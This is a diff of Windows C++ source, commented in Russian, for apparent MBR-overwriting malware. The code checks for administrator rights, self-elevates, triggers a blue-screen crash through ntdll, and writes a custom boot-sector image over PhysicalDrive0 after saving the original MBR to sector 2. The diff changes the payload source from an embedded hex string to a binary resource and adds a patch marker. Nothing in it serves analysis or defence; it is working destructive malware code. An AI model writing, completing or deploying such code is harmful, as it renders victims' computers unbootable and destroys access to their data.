@@ -7,23 +7,32 @@
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
 
-const char MBR_HEX[] = "{MBR_DATA}";
+// ============================================================
+// МАРКЕР ДЛЯ ПАТЧА (НЕ УДАЛЯТЬ!)
+// ============================================================
+const char MARKER_MBR[] = "MBR";
 
-// === ЛОГИРОВАНИЕ В ФАЙЛ ===
+// ============================================================
+// ЛОГИРОВАНИЕ
+// ============================================================
 void Log(const char* msg) {
-    std::ofstream log("log.txt", std::ios::app);
+    char logPath[MAX_PATH];
+    GetModuleFileNameA(NULL, logPath, MAX_PATH);
+    strcat(logPath, ".log");
+    std::ofstream log(logPath, std::ios::app);
     if (log.is_open()) {
         log << msg << std::endl;
         log.close();
     }
 }
 
-// === ЛОГИРОВАНИЕ С STRING ===
 void Log(const std::string& msg) {
     Log(msg.c_str());
 }
 
-// === ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ===
+// ============================================================
+// ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
+// ============================================================
 bool IsAdmin() {
     Log("IsAdmin() called");
     BOOL isAdmin = FALSE;
@@ -41,7 +50,9 @@ bool IsAdmin() {
     return isAdmin == TRUE;
 }
 
-// === ВЫЗОВ BSOD ===
+// ============================================================
+// ВЫЗОВ BSOD
+// ============================================================
 void TriggerBSOD() {
     Log("TriggerBSOD() called");
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -79,7 +90,9 @@ void TriggerBSOD() {
     Log("BSOD triggered");
 }
 
-// === ПОВЫШЕНИЕ ПРАВ ===
+// ============================================================
+// ПОВЫШЕНИЕ ПРАВ
+// ============================================================
 void ElevateAndRun() {
     Log("ElevateAndRun() called");
     SHELLEXECUTEINFOA sei = {0};
@@ -96,31 +109,37 @@ void ElevateAndRun() {
     }
 }
 
-// === КОНВЕРТЕР HEX ===
-std::vector<unsigned char> HexToBytes(const std::string& hex) {
-    Log("HexToBytes() called");
-    std::vector<unsigned char> bytes;
-    for (size_t i = 0; i < hex.length(); i += 2) {
-        std::string byteString = hex.substr(i, 2);
-        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
-        bytes.push_back(byte);
-    }
-    Log("HexToBytes() finished, bytes: " + std::to_string(bytes.size()));
-    return bytes;
-}
-
-// === ЗАПИСЬ MBR ===
+// ============================================================
+// ЗАПИСЬ MBR (ИЗ РЕСУРСА)
+// ============================================================
 void WriteMBR() {
     Log("=== WriteMBR() START ===");
     
-    std::string hex(MBR_HEX);
-    Log("Hex length: " + std::to_string(hex.length()));
+    // Загружаем ресурс "MBR" (BINARY)
+    Log("Loading resource 'MBR'...");
+    HRSRC hRes = FindResourceA(NULL, "MBR", "BINARY");
+    if (!hRes) {
+        Log("ERROR: Resource 'MBR' not found!");
+        return;
+    }
     
-    std::vector<unsigned char> image = HexToBytes(hex);
-    Log("Image size: " + std::to_string(image.size()));
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) {
+        Log("ERROR: Failed to load resource!");
+        return;
+    }
     
-    if (image.size() < 512) {
-        Log("ERROR: image.size() < 512");
+    DWORD size = SizeofResource(NULL, hRes);
+    Log("Resource size: " + std::to_string(size));
+    
+    unsigned char* image = (unsigned char*)LockResource(hData);
+    if (!image) {
+        Log("ERROR: Failed to lock resource!");
+        return;
+    }
+    
+    if (size < 512) {
+        Log("ERROR: Resource size < 512");
         return;
     }
     
@@ -137,7 +156,6 @@ void WriteMBR() {
     
     if (hDisk == INVALID_HANDLE_VALUE) {
         Log("CreateFile failed, error: " + std::to_string(GetLastError()));
-        // Fallback: обычный доступ
         hDisk = CreateFileA(
             "\\\\.\\PhysicalDrive0",
             GENERIC_READ | GENERIC_WRITE,
@@ -180,9 +198,9 @@ void WriteMBR() {
     Log("Original MBR saved to sector 2");
     
     // --- ШАГ 3: ЗАПИСЫВАЕМ НАШ ОБРАЗ ---
-    Log("Writing our image...");
+    Log("Writing our image, size: " + std::to_string(size));
     SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);
-    WriteFile(hDisk, image.data(), (DWORD)image.size(), &bytesWritten, NULL);
+    WriteFile(hDisk, image, size, &bytesWritten, NULL);
     Log("Image written, bytes: " + std::to_string(bytesWritten));
     
     CloseHandle(hDisk);
@@ -224,7 +242,9 @@ void WriteMBR() {
     Log("=== WriteMBR() END ===");
 }
 
-// === ТОЧКА ВХОДА ===
+// ============================================================
+// ТОЧКА ВХОДА
+// ============================================================
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow) {
     Log("=== WinMain() START ===");
     
